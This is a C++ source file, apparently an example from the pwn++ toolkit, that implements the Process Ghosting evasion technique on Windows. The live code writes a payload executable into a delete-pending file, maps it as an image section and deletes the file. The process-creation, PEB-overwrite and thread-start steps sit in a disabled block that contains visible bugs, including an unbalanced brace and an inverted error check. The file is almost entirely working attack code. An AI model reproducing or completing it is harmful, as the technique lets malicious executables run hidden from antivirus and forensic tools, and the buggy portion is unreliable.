///
/// @file ProcessGhosting.cpp
///
/// @author @hugsy
///
/// @brief Basic implementation of Process Ghosting - all credits to Gabriel Landau, this file is just an example of
/// using pwn++ for the attack he invented
///
/// @ref Gabriel Landau - https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack
///

#include <pwn.hpp>
#include <stdexcept>
using namespace pwn;


auto
wmain(const int argc, const wchar_t** argv) -> int
{
    Context.Set(Log::LogLevel::Debug);

    //
    // By default, the program will execute `winver.exe` as the ghost process of `ghost.exe`
    //
    const auto GhostProcessPath = (argc >= 2) ? std::filesystem::path(argv[1]) :
                                                std::filesystem::path(L"\\\\?\\C:\\Windows\\System32\\winver.exe");

    const auto GhostedProcessPath =
        (argc >= 3) ? std::filesystem::path(argv[2]) : std::filesystem::path(L"\\\\?\\c:\\temp\\ghost.exe");

    dbg("Ghosting '{}' as '{}'", GhostProcessPath.string(), GhostedProcessPath.string());


    //
    // 1. Create a file
    //
    auto GhostFile   = FileSystem::File(GhostedProcessPath);
    auto PayloadFile = FileSystem::File(GhostProcessPath);
    if ( !GhostFile.IsValid() || !PayloadFile.IsValid() )
    {
        return EXIT_FAILURE;
    }


    //
    // 2. Put the file into a delete-pending state using NtSetInformationFile(FileDispositionInformation). Note:
    // Attempting to use FILE_DELETE_ON_CLOSE instead will not delete the file.
    //
    GhostFile.ReOpenFileWith(GENERIC_WRITE);

    FILE_DISPOSITION_INFORMATION fdi {};
    fdi.DeleteFile = true;
    if ( Failed(GhostFile.Set(FILE_INFORMATION_CLASS::FileDispositionInformation, fdi)) )
    {
        return EXIT_FAILURE;
    }


    //
    // 3. Write the payload executable to the file. The content isn’t persisted because the file is already
    // delete-pending. The delete-pending state also blocks external file-open attempts.
    //
    {
        auto const FileSize = ValueOr<usize>(PayloadFile.Size(), 0);
        auto hMap           = Value(PayloadFile.Map(PAGE_READONLY));
        auto hView          = Value(PayloadFile.View(hMap.get(), FILE_MAP_READ, 0, FileSize));
        DWORD bytesWritten {};
        ::WriteFile(GhostFile.Handle(), hView.get(), FileSize, &bytesWritten, nullptr);
    }


    //
    // 4. Create an image section for the file.
    //
    UniqueHandle hSection {
        [&GhostFile]() -> HANDLE
        {
            HANDLE h {};
            auto Status = pwn::Resolver::ntdll::NtCreateSection(
                &h,
                SECTION_ALL_ACCESS,
                nullptr,
                nullptr,
                PAGE_READONLY,
                SEC_IMAGE,
                GhostFile.Handle());
            if ( !NT_SUCCESS(Status) )
            {
                Log::ntperror("NtCreateSection", Status);
                return nullptr;
            }
            return h;
        }()};
    if ( !hSection )
    {
        Log::perror("NtCreateSection");
        return EXIT_FAILURE;
    }

    dbg("Section opened as {}", hSection.get());


    //
    // 5. Close the delete-pending handle, deleting the file.
    //
    GhostFile.Close();


    // TODO restore
#if 0
    //
    // 6. Create a process using the image section.
    //
    UniqueHandle hProcess {
        [&hSection]() -> HANDLE
        {
            HANDLE h;
            return NT_SUCCESS(pwn::Resolver::ntdll::NtCreateProcessEx(
                       &h,
                       PROCESS_ALL_ACCESS,
                       nullptr,
                       ::GetCurrentProcess(),
                       0,
                       hSection.get(),
                       nullptr,
                       nullptr,
                       false)) ?
                       h :
                       nullptr;
        }()};
    if ( !hProcess )
    {
        Log::perror("NtCreateProcessEx");
        return EXIT_FAILURE;
    }

    Process::Process GhostedProcess(::GetProcessId(hProcess.get()), hProcess.get()};
    ok("Process created with PID={}", GhostedProcess.ProcessId());


    //
    // 7. Assign process arguments and environment variables.
    //


    auto PebRaw = Value(GhostedProcess.Memory.Read((uptr)GhostedProcess.ProcessEnvironmentBlock(), sizeof(PEB)));
    auto Peb    = reinterpret_cast<PEB*>(PebRaw.data());
    Binary::PE PeTarget {GhostProcessPath};
    Peb->ImageBaseAddress =
        (PVOID)((uptr)(std::get<Binary::PE::PeHeader64>(PeTarget.Header()).OptionalHeader.AddressOfEntryPoint));
    GhostedProcess.Memory.Write((uptr)GhostedProcess.ProcessEnvironmentBlock(), PebRaw);
    dbg("Overwriting PEB in process PID={}", GhostedProcess.ProcessId());


    //
    // 8. Create a thread to execute in the process.
    //
    const uptr StartAddress = 0;
    UniqueHandle hThread {
        [&hProcess, &StartAddress]() -> HANDLE
        {
            HANDLE h;
            return NT_SUCCESS(pwn::Resolver::ntdll::NtCreateThreadEx(
                       &h,
                       THREAD_ALL_ACCESS,
                       nullptr,
                       hProcess.get(),
                       (LPTHREAD_START_ROUTINE)StartAddress,
                       nullptr,
                       false,
                       0,
                       0,
                       0,
                       nullptr)) ?
                       h :
                       nullptr;
        }()};
    if ( hThread )
    {
        Log::perror("NtCreateThreadEx");
        return EXIT_FAILURE;
    }

    ok("Started thread TID={} with start address @ {} in process PID={}",
       hThread.get(),
       StartAddress,
       GhostedProcess.ProcessId());
#endif

    Utils::Pause();

    return EXIT_SUCCESS;
}
